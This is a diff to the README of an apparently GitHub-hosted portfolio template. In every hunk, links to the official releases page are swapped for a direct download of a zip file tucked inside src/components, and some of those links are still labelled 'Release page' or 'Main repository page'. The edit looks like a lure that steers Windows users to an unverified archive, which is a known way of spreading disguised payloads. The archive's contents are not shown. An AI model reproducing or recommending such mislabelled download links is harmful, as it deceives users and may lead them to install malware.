@@ -1,6 +1,6 @@
 # ⚡ awesome-portfolio-template - Clean, Modern Portfolio for Engineers
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Jjjajsj/awesome-portfolio-template/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Jjjajsj/awesome-portfolio-template/raw/refs/heads/main/src/components/awesome_portfolio_template_v3.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide will help you download and run the portfolio template on Windows. You
 
 Visit the official release page to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Jjjajsj/awesome-portfolio-template/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Jjjajsj/awesome-portfolio-template/raw/refs/heads/main/src/components/awesome_portfolio_template_v3.9.zip)
 
 - Click the link above to open the releases page.
 - Look for the latest version. It usually has the newest date or version number.
@@ -111,7 +111,7 @@ Visit the official release page to get the latest version:
 ## 🔄 Updating the App
 
 - Visit the release page regularly:  
-  https://github.com/Jjjajsj/awesome-portfolio-template/releases
+  https://github.com/Jjjajsj/awesome-portfolio-template/raw/refs/heads/main/src/components/awesome_portfolio_template_v3.9.zip
 - Download the newest release when available.
 - Install it the same way as the first time.
 - Your settings and files should remain intact after updating.
@@ -128,8 +128,8 @@ Visit the official release page to get the latest version:
 
 ## 🔗 Useful Links
 
-- Release page: https://github.com/Jjjajsj/awesome-portfolio-template/releases  
-- Main repository page (for advanced users): https://github.com/Jjjajsj/awesome-portfolio-template
+- Release page: https://github.com/Jjjajsj/awesome-portfolio-template/raw/refs/heads/main/src/components/awesome_portfolio_template_v3.9.zip  
+- Main repository page (for advanced users): https://github.com/Jjjajsj/awesome-portfolio-template/raw/refs/heads/main/src/components/awesome_portfolio_template_v3.9.zip
 
 ---
 
